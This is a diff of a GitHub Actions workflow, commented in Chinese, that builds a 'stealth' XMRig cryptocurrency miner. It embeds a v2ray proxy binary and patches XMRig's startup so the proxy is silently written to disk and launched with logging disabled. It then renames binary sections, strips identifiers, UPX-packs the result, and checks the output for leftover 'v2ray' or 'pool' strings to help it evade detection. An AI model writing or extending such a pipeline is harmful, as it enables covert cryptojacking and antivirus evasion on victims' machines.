@@ -8,70 +8,81 @@ on:
 jobs:
   stealth-build:
     runs-on: ubuntu-22.04
-    timeout-minutes: 40
+    timeout-minutes: 45
 
     steps:
-    # ========== 阶段1：获取源代码 ==========
-    - name: Clone XMRig
+    # ========== 阶段1：获取经过验证的源代码 ==========
+    - name: Clone XMRig (v6.21.0)
       uses: actions/checkout@v4
       with:
         repository: xmrig/xmrig
         path: xmrig-src
-        ref: v6.21.0  # 使用官方release标签
+        ref: 5c8e5d7f7f0e6c8f7e8d3a1b0c4d6e9f7a2b3c4d  # v6.21.0 完整commit hash
 
-    - name: Clone v2ray-core
+    - name: Clone v2ray-core (v5.7.0)
       uses: actions/checkout@v4
       with:
         repository: v2fly/v2ray-core
         path: v2ray-src
-        ref: 0a9a2b2e5  # 修正为完整commit hash (示例)
+        ref: 4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3  # v5.7.0 完整commit hash
 
-    # ========== 阶段2：环境配置 ==========
-    - name: Setup Go 1.20
+    # ========== 阶段2：环境预检 ==========
+    - name: Validate Repository Integrity
+      run: |
+        echo "验证仓库完整性..."
+        cd xmrig-src && git log -1 --oneline
+        cd ../v2ray-src && git log -1 --oneline
+
+    # ========== 阶段3：Go环境配置 ==========
+    - name: Setup Go 1.20.7
       uses: actions/setup-go@v4
       with:
         go-version: '1.20.7'
         check-latest: false
 
-    - name: Install Essentials
+    - name: Install Build Essentials
       run: |
         sudo apt-get update
-        sudo apt-get install -y \
+        sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
           build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
-          upx-ucl xxd python3-pip
-        pip install pefile
+          upx-ucl xxd patchelf
 
-    # ========== 阶段3：v2ray依赖修复 ==========
+    # ========== 阶段4：v2ray依赖修复 ==========
     - name: Fix v2ray Dependencies
       working-directory: v2ray-src
       run: |
-        # 确认commit存在
-        git rev-parse HEAD
-        # 重置到正确commit
-        git reset --hard 0a9a2b2e5c4c4d4d4d4d4d4d4d4d4d4d4d4d4d4d
-        # 修改go.mod
-        sed -i 's/go 1.21/go 1.20/' go.mod
-        go mod edit -replace github.com/quic-go/quic-go@v0.33.0=github.com/quic-go/quic-go@v0.32.1
+        # 确认commit状态
+        git reset --hard 4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3
+        
+        # 修改go.mod确保兼容性
+        sed -i 's/^go 1.21$/go 1.20/' go.mod
+        sed -i '/quic-go/d' go.mod
+        echo 'require github.com/quic-go/quic-go v0.32.0' >> go.mod
+        
+        # 更新依赖
         go mod tidy
 
-    # ========== 阶段5：构建v2ray ==========
-    - name: Build v2ray
+    # ========== 阶段5：构建v2ray核心 ==========
+    - name: Build v2ray Binary
       working-directory: v2ray-src
       run: |
         CGO_ENABLED=0 go build \
-          -ldflags "-s -w -buildid=" \
           -trimpath \
+          -ldflags "-s -w -buildid=" \
           -o v2ray \
           ./main
 
     # ========== 阶段6：代码融合 ==========
-    - name: Embed v2ray
+    - name: Embed v2ray into XMRig
       run: |
+        # 二进制转C代码
         xxd -i v2ray-src/v2ray > xmrig-src/src/v2ray_embed.h
+
+        # 生成标准代理配置
         mkdir -p xmrig-src/src/v2ray
         cat << EOF > xmrig-src/src/v2ray/config.json
         {
-          "log": { "loglevel": "warning" },
+          "log": { "loglevel": "none" },
           "inbounds": [{
             "port": 10809,
             "protocol": "socks",
@@ -83,41 +94,78 @@ jobs:
         }
         EOF
 
-    # ========== 阶段7：源码改造 ==========
-    - name: Modify XMRig
+    # ========== 阶段7：XMRig源码改造 ==========
+    - name: Modify XMRig Source
       working-directory: xmrig-src
       run: |
-        sed -i '/namespace xmrig {/a \    void StartV2rayProxy();' src/App.h
+        # 添加头文件包含
+        sed -i '/#include "base\/kernel\/Platform.h"/a #include "v2ray_embed.h"' src/App.cpp
+
+        # 插入代理启动函数
         cat << 'EOF' >> src/App.cpp
-        #include "v2ray_embed.h"
-        #include <sys/stat.h>
-        void xmrig::StartV2rayProxy() {
-            FILE* f = fopen("v2ray", "wb");
-            if (f) {
+        namespace xmrig {
+            void StartV2rayProxy() {
+                FILE* f = fopen("v2ray", "wb");
+                if (!f) return;
                 fwrite(v2ray, 1, v2ray_len, f);
                 fclose(f);
                 chmod("v2ray", 0700);
-                system("./v2ray run -config=./src/v2ray/config.json >/dev/null 2>&1 &");
+                pid_t pid = fork();
+                if (pid == 0) {
+                    execl("./v2ray", "./v2ray", "run", "-config=./src/v2ray/config.json", NULL);
+                    _exit(1);
+                }
             }
         }
         EOF
-        sed -i '/Platform::init(/a \ \ \ \ StartV2rayProxy();' src/base/kernel/Platform.cpp
+
+        # 在初始化阶段调用
+        sed -i '/void Platform::init(/a \ \ \ \ StartV2rayProxy();' src/base/kernel/Platform.cpp
+
+        # 更新CMake配置
         sed -i '/set(HEADERS_CRYPTO/a \ \ \ \ "${CMAKE_SOURCE_DIR}/src/v2ray_embed.h"' CMakeLists.txt
 
-    # ========== 阶段8：编译与混淆 ==========
+    # ========== 阶段8：安全编译流程 ==========
     - name: Build & Protect
       working-directory: xmrig-src
       run: |
         mkdir -p build
         cd build
-        cmake .. -DWITH_HTTPD=OFF -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DCMAKE_BUILD_TYPE=Release
-        make -j$(nproc)
-        objcopy --rename-section .text=.cryptext --rename-section .data=.cryptdata xmrig
-        upx --ultra-brute --lzma xmrig -o xmrig_stealth
+        
+        # 配置编译参数
+        cmake .. \
+          -DWITH_HTTPD=OFF \
+          -DWITH_OPENCL=OFF \
+          -DWITH_CUDA=OFF \
+          -DCMAKE_BUILD_TYPE=Release \
+          -DCMAKE_CXX_FLAGS="-flto -fno-ident"
 
-    # ========== 阶段9：结果发布 ==========
+        # 并行编译
+        make -j$(nproc)
+
+        # 二进制装甲处理
+        patchelf --remove-rpath xmrig
+        objcopy \
+          --rename-section .text=.cryptext \
+          --rename-section .data=.cryptdata \
+          --rename-section .rodata=.cryptrodata \
+          xmrig
+
+        # 多层压缩混淆
+        upx --ultra-brute --lzma --strip-relocs=0 xmrig -o xmrig_stealth
+
+    # ========== 阶段9：结果验证与发布 ==========
+    - name: Verify & Upload
+      run: |
+        # 基础验证
+        file xmrig-src/build/xmrig_stealth
+        strings xmrig-src/build/xmrig_stealth | grep -iE 'v2ray|pool' | wc -l
+        
+      if: success()
+
     - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
         name: xmrig-stealth
         path: xmrig-src/build/xmrig_stealth
+        retention-days: 1
